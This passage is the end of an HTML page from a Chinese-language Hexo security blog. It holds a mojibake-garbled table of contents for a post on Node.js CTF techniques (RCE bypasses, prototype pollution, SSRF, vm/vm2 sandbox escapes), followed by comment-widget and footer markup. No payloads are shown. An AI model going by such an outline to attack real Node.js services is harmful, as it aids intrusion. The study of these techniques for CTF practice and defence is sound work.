href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%89%B9%E6%80%A7"><span class="toc-number">1.1.</span> <span class="toc-text">å¤§å°å†™ç‰¹æ€§</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83"><span class="toc-number">1.2.</span> <span class="toc-text">å¼±ç±»å‹æ¯”è¾ƒ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E6%AF%94%E8%BE%83"><span class="toc-number">1.2.1.</span> <span class="toc-text">å¤§å°æ¯”è¾ƒ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E6%AF%94%E8%BE%83"><span class="toc-number">1.2.2.</span> <span class="toc-text">æ•°ç»„æ¯”è¾ƒ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%98%E6%9C%89%E4%B8%80%E4%BA%9B%E6%AF%94%E8%BE%83%E7%89%B9%E5%88%AB%E7%9A%84%E7%9B%B8%E7%AD%89%EF%BC%9A"><span class="toc-number">1.2.3.</span> <span class="toc-text">è¿˜æœ‰ä¸€äº›æ¯”è¾ƒç‰¹åˆ«çš„ç›¸ç­‰ï¼š</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E6%8B%BC%E6%8E%A5%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">å˜é‡æ‹¼æ¥ï¼š</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MD5%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">MD5çš„ç»•è¿‡</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ES6%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">1.5.</span> <span class="toc-text">ES6æ¨¡æ¿å­—ç¬¦ä¸²</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.6.</span> <span class="toc-text">ç¼–ç ç»•è¿‡</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#16%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81"><span class="toc-number">1.6.1.</span> <span class="toc-text">16è¿›åˆ¶ç¼–ç </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unicode%E7%BC%96%E7%A0%81"><span class="toc-number">1.6.2.</span> <span class="toc-text">unicodeç¼–ç </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base%E7%BC%96%E7%A0%81"><span class="toc-number">1.6.3.</span> <span class="toc-text">baseç¼–ç </span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nodejs%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">Nodejså±é™©å‡½æ•°çš„åˆ©ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.1.</span> <span class="toc-text">å‘½ä»¤æ‰§è¡Œ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#eval"><span class="toc-number">2.1.1.</span> <span class="toc-text">eval</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#settimeout"><span class="toc-number">2.1.2.</span> <span class="toc-text">settimeout()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#setinterval"><span class="toc-number">2.1.3.</span> <span class="toc-text">setinterval()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#function"><span class="toc-number">2.1.4.</span> <span class="toc-text">function()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"><span class="toc-number">2.2.</span> <span class="toc-text">æ–‡ä»¶è¯»å†™</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nodejs%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0-RCE-bypass"><span class="toc-number">2.3.</span> <span class="toc-text">nodejså±é™©å‡½æ•°-RCE bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E6%8B%BC%E6%8E%A5"><span class="toc-number">2.3.1.</span> <span class="toc-text">å­—ç¬¦æ‹¼æ¥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87-1"><span class="toc-number">2.3.2.</span> <span class="toc-text">ç¼–ç ç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%8B%BC%E6%8E%A5"><span class="toc-number">2.3.3.</span> <span class="toc-text">æ¨¡æ¿æ‹¼æ¥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%87%BD%E6%95%B0"><span class="toc-number">2.3.4.</span> <span class="toc-text">å…¶ä»–å‡½æ•°</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nodejs-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">3.</span> <span class="toc-text">nodejs-åŸå‹é“¾æ±¡æŸ“</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.</span> <span class="toc-text">åŸç†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#merge%E6%93%8D%E4%BD%9C%E5%AF%BC%E8%87%B4%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">3.2.</span> <span class="toc-text">mergeæ“ä½œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lodash"><span class="toc-number">3.3.</span> <span class="toc-text">lodash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ejs"><span class="toc-number">3.4.</span> <span class="toc-text">ejs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jade"><span class="toc-number">3.5.</span> <span class="toc-text">jade</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#squirrelly"><span class="toc-number">3.6.</span> <span class="toc-text">squirrelly</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nodejs%E4%B8%AD%E7%9A%84ssrf"><span class="toc-number">4.</span> <span class="toc-text">nodejsä¸­çš„ssrf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">4.1.</span> <span class="toc-text">åŸç†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GYCTF2020-Node-Game"><span class="toc-number">4.2.</span> <span class="toc-text">[GYCTF2020]Node Game</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">5.</span> <span class="toc-text">vmæ²™ç®±é€ƒé€¸</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">5.1.</span> <span class="toc-text">åŸç†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vm%E9%80%83%E9%80%B8"><span class="toc-number">5.2.</span> <span class="toc-text">vmé€ƒé€¸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vm2"><span class="toc-number">5.3.</span> <span class="toc-text">vm2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#safe-eval%E6%A8%A1%E5%9D%97%E9%80%83%E9%80%B8"><span class="toc-number">5.4.</span> <span class="toc-text">safe-evalæ¨¡å—é€ƒé€¸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ctf%E9%A2%98%E7%9B%AE"><span class="toc-number">5.5.</span> <span class="toc-text">ctfé¢˜ç›®</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzNode"><span class="toc-number">5.5.1.</span> <span class="toc-text">[GKCTF2020]EZä¸‰å‰‘å®¢-EzNode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%B4%E5%A4%9A%E9%80%83%E9%80%B8payload"><span class="toc-number">5.6.</span> <span class="toc-text">æ›´å¤šé€ƒé€¸payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E6%8C%91%E6%88%98"><span class="toc-number">6.</span> <span class="toc-text">ä¸€äº›æœ‰è¶£çš„æŒ‘æˆ˜</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CSIVITU-2020-File-Library"><span class="toc-number">6.1.</span> <span class="toc-text">CSIVITU 2020-File Library</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#corCTF2022-a-simple-waf"><span class="toc-number">6.2.</span> <span class="toc-text">corCTF2022 a simple waf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A5%A5%E4%BA%91%E6%9D%AF2022-RUSTwaf"><span class="toc-number">6.3.</span> <span class="toc-text">ç¥¥äº‘æ¯2022 RUSTwaf</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">7.</span> <span class="toc-text">å‚è€ƒé“¾æ¥</span></a></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="prev" href="/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/">&lt; rceè€ƒç‚¹æ€»ç»“</a><a class="next" href="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/">phpåŸç”Ÿç±»å­¦ä¹  &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
.night .v[data-class=v] a:hover { color: #216C73 !important; }
.night .v[data-class=v] li { list-style: inherit; }
.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'',
  appKey:'',
  lang: 'zh-cn',
  placeholder:'ãƒ¾ï¾‰â‰§âˆ€â‰¦)o Come on, say something...',
  avatar:'identicon',
  guest_info:guest_info,
  pageSize:'10'
})</script></div></section><footer><p>Copyright Â© 2016 - 2022 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
    search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>